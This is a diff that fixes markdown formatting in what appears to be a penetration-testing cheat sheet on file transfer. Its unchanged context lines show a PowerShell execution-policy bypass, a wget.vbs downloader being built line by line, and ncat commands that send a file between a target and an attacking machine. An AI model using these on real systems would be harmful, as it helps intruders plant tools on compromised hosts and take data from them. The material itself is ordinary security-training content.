@@ -297,7 +297,7 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File 
 
 In this first, we will echo all these commands in a file `wget.vbs`\
 If you are creating this file on Windows then it will work fine.\
-If creating on Linux and then transferring to windows then you may face issues sometimes, use **unix2dos **before you transfer it in this case.
+If creating on Linux and then transferring to windows then you may face issues sometimes, use **unix2dos** before you transfer it in this case.
 
 ```
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs  
@@ -619,7 +619,7 @@ Ncat can create a secure, encrypted connection over SSL/TLS. You can set up a li
 ncat -nvlp port --ssl > out-file
 ```
 
-_ _Then connect to the listener from the attacking machine with:
+&#x20;__ Then connect to the listener from the attacking machine with:
 
 ```
 ncat -nv target-ip port --ssl < file-to-send
